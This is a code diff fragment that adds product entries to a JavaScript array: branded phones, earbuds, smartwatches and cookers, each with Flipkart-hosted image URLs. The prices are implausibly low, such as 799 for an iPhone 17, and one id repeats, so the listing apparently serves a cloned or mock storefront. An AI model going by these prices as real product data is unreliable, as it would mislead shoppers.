+            { id: 14, name: "realme Buds T200 Lite with 12.4mm Driver, 48hrs Playback, AI ENC & Dual-Device Pairing Bluetooth (Volt Black, True Wireless)", price: "99", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/d/b/h/-original-imaha6btcgqdqy5e.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/k/5/-original-imaha7fgrazfuvz2.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/i/w/h/-original-imaha7fgyghhncsg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/7/i/4/-original-imaha7fgy8ysh2bx.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/8/q/9/-original-imaha7fgce4dfrz8.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/6/9/-original-imaha7fghe5az3xg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/h/g/-original-imaha7fgx2h4rdvg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/h/g/-original-imaha7fgx2h4rdvg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/n/c/v/-original-imaha7fgthpgr4fg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/9/x/-original-imaha6bthz7h6g7w.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/d/e/q/-original-imaha6btgzbgt4ez.jpeg?q=70&crop=false"] },
+            { id: 15, name: "boAt Airdopes 161, Adv 4Mic ENx, 50H Battery,Fast Charge,13mm Driver, Metallic Finish Bluetooth (Carbon Black, True Wireless)", price: "99", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/z/g/i/-original-imahgnf4dwfyzzc5.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/speaker/h/g/e/-original-imahed7herhzzqtb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/t/n/-original-imah3ysbbfnmuhtj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/t/c/a/-original-imah3ysbu9zyhbhs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/i/w/-original-imah3ysbrchdwyxg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/c/5/g/-original-imah3ysbzuumhuam.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/p/w/g/-original-imah3ysbxhzvjgmx.jpeg?q=70&crop=false"] },
+            { id: 16, name: "boAt Rockerz Prime 415, 360 Spatial Audio,120H Battery,AI-ENx,BEAST Mode,App Support Bluetooth (White Sabre, Gold, On the Ear)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/p/8/l/-original-imahhrt7pmkge6hv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/y/c/q/-original-imahhrt7tpzdgw5g.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/s/n/-original-imahhrt7rzxcraxh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/n/w/i/-original-imahhrt7rjpxxynt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/8/d/-original-imahhrt7e9qgxyjp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/7/h/n/-original-imahhrt7cyhyhmht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/w/c/e/-original-imahhrt7kwuzq5uh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/headphone/y/v/n/-original-imahhrt7gh9jpctg.jpeg?q=70&crop=false"] },
+            { id: 17, name: "GOBOULT (formerly Boult) Bluetooth & Wired (Powder Blue, On the Ear)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/q/y/j/-original-imahfvuh3x8epgnk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/i/m/j/-original-imahgbc8yhzraht6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/l/d/3/-original-imahgbc8pzdncbrv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/l/9/n/-original-imahgbc8jjrgc88p.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/5/c/r/-original-imahgbc8fptzpccz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/y/c/v/-original-imahgbc892x3pmrp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/o/l/t/-original-imahgbc8tpsckv3z.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/k/o/7/-original-imahgbc8hswt6fqg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/v/m/d/-original-imahfvuhge47mzvy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/a/q/a/-original-imahgbc8nvyjda3s.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/c/z/5/-original-imahgbc8hfhahgfg.jpeg?q=70&crop=false"," https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/r/7/e/-original-imahgbc8zyfcygvm.jpeg?q=70&crop=false"] },                                                                                                          
+            { id: 18, name: "Noise Buds VS102 Elite with 50Hr Playtime, ENC, Quad Mic, Chrome finish Flybird Design Bluetooth (Carbon Black, True Wireless)", price: "99", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/i/a/s/-original-imahhqhzgjnggg27.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/c/g/u/-original-imahhqhzdhgvr66a.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/m/h/j/-original-imahhqhzkhmffyzz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/y/z/i/-original-imahhqhzjzngamwt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/g/p/f/-original-imahhqhzwhabqmnz.jpeg?q=70&crop=false"] },
+            { id: 19, name: "Apple iPhone 17 (Mist Blue, 256 GB)", price: "799", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/p/x/y/-original-imahft5gkyd8wcqc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/u/p/d/-original-imahft5gh67c7rjm.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/o/l/k/-original-imahft5gmw27n7az.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/c/g/n/-original-imahft5gabuhqjum.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/k/8/6/-original-imahft5geqtza98s.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/d/c/x/-original-imahft5gveszbamr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/7/m/d/-original-imahft5gxkectxe4.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/n/v/q/-original-imahft5gzju88g2w.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/b/t/1/-original-imahft5gbpfuhuph.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/h/k/q/-original-imahft5gb66vghzd.jpeg?q=70&crop=false"] },
+            { id: 20, name: "Apple iPhone 15 (Pink, 128 GB)", price: "799", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/a/c/k/-original-imagtc5fuzkvczr7.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/e/f/7/-original-imagtc5fhkhum3by.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/u/m/3/-original-imagtc5ffhbausfy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/y/h/e/-original-imah4xe6mju2vbjw.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/4/b/j/-original-imah4xe6hwmfyxdn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/a/v/k/-original-imagtc5fx9jzazdy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/i/h/z/-original-imagtc5fbxefnjtj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/l/g/s/-original-imah4xe6e9gsvyeh.jpeg?q=70&crop=false"] },
+            { id: 21, name: "OnePlus Bullets Wireless Z2 Bluetooth (Beam Blue, In the Ear)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/u/x/g/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jpffgzebs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/x/f/a/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jmgmaep2g.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/j/6/o/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jzg63bvjf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/headphone/9/9/s/bullets-wireless-z2-bluetooth-oneplus-original-imahdt5jm36xjxve.jpeg?q=70&crop=false"] },
+            { id: 21, name: "Mi 20000 mAh 18 W Power Bank (Sandstone Black, Lithium-ion, Fast Charging for Mobile, Earbuds, Speaker, Smartwatch, Trimmer, Tablet)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/kfcv6vk0/power-bank/r/f/5/power-bank-20000-plm18zm-mi-original-imafvtc7x9zgrzbz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/kfcv6vk0/power-bank/r/f/5/power-bank-20000-plm18zm-mi-original-imafvtc7zzxgrfhe.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/kfcv6vk0/power-bank/r/f/5/power-bank-20000-plm18zm-mi-original-imafvtc7uvrkykv9.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/kfcv6vk0/power-bank/r/f/5/power-bank-20000-plm18zm-mi-original-imafvtc7p8fwk7pt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/kfcv6vk0/power-bank/r/f/5/power-bank-20000-plm18zm-mi-original-imafvtc7fxjup2e6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/kfcv6vk0/power-bank/r/f/5/power-bank-20000-plm18zm-mi-original-imafvtc7kz9baxxt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/kfcv6vk0/power-bank/r/f/5/power-bank-20000-plm18zm-mi-original-imafvtc7cutvhngq.jpeg?q=70&crop=false"] },
+            { id: 22, name: "boAt Wave Fury with 1.83'' HD Display, Bluetooth Calling & Functional Crown Smartwatch (Cherry Blossom Strap, Free Size)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/6/a/9/-original-imagy97zzfa2dpgg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/s/c/a/-original-imagx42xuvycmed7.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/t/1/r/-original-imagr6xt52kxf4zs.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/s/e/r/-original-imagsgj93yzfdyzk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/r/e/v/-original-imagr6xtybgjhhny.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/y/m/z/-original-imagr6xtf7j7vz5r.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/d/f/b/-original-imagr6xtg6qgz33n.jpeg?q=70&crop=false"] },
+            { id: 23, name: "Fire-Boltt Hurricane 33.02mm (1.3) Curved Glass Display with BT Calling, 100+ Sports Modes Smartwatch (Grey Strap, Free Size)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/x/j/s/-original-imah4eddxhvzpxhc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/r/8/4/-original-imah6efgp9hjjcyf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/i/v/y/-original-imah6efgvkk9vrtt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/n/d/w/-original-imah4edddxppwyuj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/r/x/z/-original-imah4eddnnhjtjft.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/8/j/t/-original-imah4eddehsfxjye.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/z/7/o/-original-imah4eddqscqwgbh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/b/j/l/-original-imah4edd5dwuqtxz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/6/l/g/-original-imah4edd6aheu7sd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/q/9/f/-original-imah6efgfmafzfhg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/v/g/s/-original-imah4eddafvceug7.jpeg?q=70&crop=false"] },
+            { id: 24, name: "GOBOULT Drift+ 1.85, BT Calling, 500Nits Brightness, 150+ Watchfaces Smartwatch (Jet Black Strap, Free Size)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/r/g/k/-original-imahf98j6ea4gkrf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/y/o/p/-original-imahgtxdnj2fgz66.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/g/m/s/-original-imahgtxdbnexy8cz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/j/2/v/-original-imahgtxdmq6qe6qj.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/d/s/j/-original-imahgtxdtardu8es.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/2/m/c/-original-imahgtxdwhdh7qub.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/smartwatch/x/t/f/-original-imahgtxdacqnky3k.jpeg?q=70&crop=false"] },
+            { id: 25, name: "Fire-Boltt Rise Bluetooth Calling 47mm (1.85), Metal Bod & Rotating Crown, 123 Sports Smartwatch (Grey Strap, Free Size)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/u/i/-original-imah82pnswgua2vh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/t/w/a/-original-imah6efg47ffz9hv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/j/j/g/-original-imah6efgh9ezfhdn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/x/q/k/-original-imah6efgnckzygsc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/g/e/j/-original-imah6efgvccxs7ab.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/g/g/h/-original-imah6efgfxsewkrg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/k/q/p/-original-imah6efgfgefxf7a.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/u/k/b/-original-imahdyxrzhrze5gt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/u/k/p/-original-imahdyxrdx8eshdh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/u/h/h/-original-imah6efgfbhgg8y3.jpeg?q=70&crop=false"] },
+            { id: 26, name: "Noise Colorfit Icon 2 1.8'' Display with Bluetooth Calling, AI Voice Assistant Smartwatch (Silver Grey Strap, Regular)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/y/v/7/-original-imah76jhgpcaktrv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/l5ld8y80/smartwatch/w/r/k/-original-imagg8dhqrgahms4.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/l5ld8y80/smartwatch/a/e/x/-original-imagg8ddax9pqgtf.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/l5ld8y80/smartwatch/i/x/k/-original-imagg8dh2dzvz44e.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/l5ld8y80/smartwatch/3/i/0/-original-imagg8dhkegggmnr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/l5ld8y80/smartwatch/v/0/f/-original-imagg8d9cuv8d5en.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/l5ld8y80/smartwatch/x/r/o/-original-imagg8dhxy6hhvee.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/l5ld8y80/smartwatch/w/f/s/-original-imagg8dhddpgdm5n.jpeg?q=70&crop=false"] },
+            { id: 27, name: "Fastrack Revoltt FS1-1.85''|Advanced Blazing Fast UI|Working Crown|AIVoice Assistant|IP68 Smartwatch (Wine Strap, Free Size)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/j/p/5/-original-imah4nbw8fsvwhhz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/w/u/9/-original-imah4nbw8hdzba66.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/3/j/i/-original-imah4nbwueksbph5.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/v/8/d/-original-imah4nbwyxeuex2v.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/7/w/a/-original-imah4nbwzy2w9s85.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/z/k/o/-original-imah4nbwwq2rhwhg.jpeg?q=70&crop=false"] },
+            { id: 28, name: "REDMI Watch Move 1.85 Premium AmoLED,14 Day Battery,Best Accuracy,Dual Core Processor Smartwatch (Silver Sprint Strap, Free Size)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/a/e/t/-original-imahgesvxrpfhymk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/2/w/-original-imahgesvgdbwvtxy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/l/k/6/-original-imahfag2jbgzfsdh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/j/u/-original-imahfag2gyxctyud.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/j/7/5/-original-imahgesv7jkdvzh6.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/u/i/k/-original-imahgesv3wgqpzvt.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/x/g/-original-imahgesvvndqnqg2.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/6/z/2/-original-imahgesvgjztxwdd.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/h/i/m/-original-imahgesvvng2y8dr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/4/r/f/-original-imahgesvft8ya6p9.jpeg?q=70&crop=false"] },
+            { id: 29, name: "Fastrack Revolt FS1+ 2.01inch Biggest UltraVU Display|Industry Best 950 Nits|BT Calling Smartwatch (Green Strap, Free Size)", price: "199", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/3/s/p/-original-imahfmpuzzq4yt8m.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/p/9/g/-original-imahfmpuwxmrggzg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/q/k/y/-original-imahfmpucay3yz2d.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/5/3/e/-original-imahfmpugs7fmquk.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/r/0/o/-original-imahfmpufygbdvbc.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/smartwatch/r/h/g/-original-imahfmpugczwa4nm.jpeg?q=70&crop=false"] },
+            { id: 30, name: "Samsung S25 Ultra 5G (Titanium Gray, 256 GB) (12 GB RAM)", price: "1799", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/7/n/l/-original-imahgfmzfgdzases.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/f/j/t/-original-imahggetqzszzxqh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/b/f/h/-original-imahggetvab85sng.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/v/q/h/-original-imahggethhfzdn9n.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/9/2/z/-original-imahggetuergm7sg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/a/y/m/-original-imahggewgkmpcggq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/w/c/d/-original-imahggeth5jngcva.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/w/7/q/-original-imahggetnje6tbpe.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/f/o/n/-original-imahggetmwxngznw.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/x/f/l/-original-imahggexa53xyeq5.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/f/r/m/-original-imahggetzegsudpx.jpeg?q=70&crop=false"] },
+            { id: 31, name: "Google Pixel 9A (Porcelain, 256 GB) (8 GB RAM)", price: "1499", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/0/q/f/-original-imahadxg8mgjzrfh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/q/d/i/pixel-9a-ga09584-in-google-original-imahaevqvcquytxz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/d/p/s/-original-imahaew3pg9qsffn.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/a/y/f/-original-imahaew3epbzkyhq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/j/z/a/-original-imahaew3tmbz8ez7.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/0/r/w/-original-imahaew3cj26hxnr.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/f/0/l/-original-imahaew3zcgegjhh.jpeg?q=70&crop=false"] },
+            { id: 32, name: "MOTOROLA Edge 60 Pro (Pantone Shadow, 256 GB) (12 GB RAM)", price: "999", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/u/b/t/-original-imahgqnzzc6cgggb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/v/n/z/-original-imahgqnzuhjj2bsp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/l/k/4/-original-imahgqnzjhck5z3x.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/v/a/v/-original-imahgqnzy26qypw8.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/d/b/d/-original-imahgqnzevzsgcys.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/r/2/l/-original-imahgqnzjc4yvnwh.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/w/0/9/-original-imahgqnz6wtykt4v.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/i/o/v/-original-imahgqnzrbbqrwfv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/e/o/k/-original-imahgqnzzwc57rj7.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/8/w/0/-original-imahgqnzpefrqrnp.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/128/128/xif0q/mobile/j/3/q/-original-imahgqnzj5t68rck.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/2/j/l/-original-imahgqnzf2e4w6h8.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/q/v/4/-original-imahgqnz9vnrqeht.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/t/c/b/-original-imahgqnztgtwzkey.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/f/6/w/-original-imahgqnz5zsmuwuz.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/mobile/h/w/x/-original-imahgqnz7tkp54r7.jpeg?q=70&crop=false"] },
+            { id: 33, name: "Greenchef GreenChef SS Pressure Cooker Namo Combo(5L+3L+2L) 5 L, 3 L, 2 L Outer Lid Induction Bottom Pressure Cooker & Pressure Pan (Stainless Steel)", price: "399", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/r/7/4/yes-3-g-chef-namo-cooker-ss-combo-5l-3l-2l-greenchef-original-imah939pt7fkhkhg.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/d/x/j/yes-3-g-chef-namo-cooker-ss-combo-5l-3l-2l-greenchef-original-imah939pbzeqaqwy.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/v/t/g/yes-3-g-chef-namo-cooker-ss-combo-5l-3l-2l-greenchef-original-imah939przjtzdw3.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/c/p/c/yes-3-g-chef-namo-cooker-ss-combo-5l-3l-2l-greenchef-original-imah939pcufrqmnc.jpeg?q=70&crop=false"] },
+            { id: 34, name: "Lifelong Set of 3 | Induction & Gas Stove Compatible with Outer Lid 2 L, 3 L, 5 L Outer Lid Induction Bottom Pressure Cooker (Stainless Steel)", price: "299", imgs: ["https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/j/t/x/yes-3-llpcsp3pes-lifelong-original-imahgwkqrextgajb.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/t/s/m/yes-3-llpcsp3pes-lifelong-original-imahgwkqgszwm3wq.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/f/s/o/yes-3-llpcsp3pes-lifelong-original-imahgwkqgfmtfehv.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/b/d/n/yes-3-llpcsp3pes-lifelong-original-imahgwkqrg7amfat.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/g/r/u/yes-3-llpcsp3pes-lifelong-original-imahgwkqxhrgpcps.jpeg?q=70&crop=false","https://rukminim2.flixcart.com/image/1000/1000/xif0q/pressure-cooker/t/r/d/-original-imahjyyh6t9zhzqe.jpeg?q=70&crop=false"] },
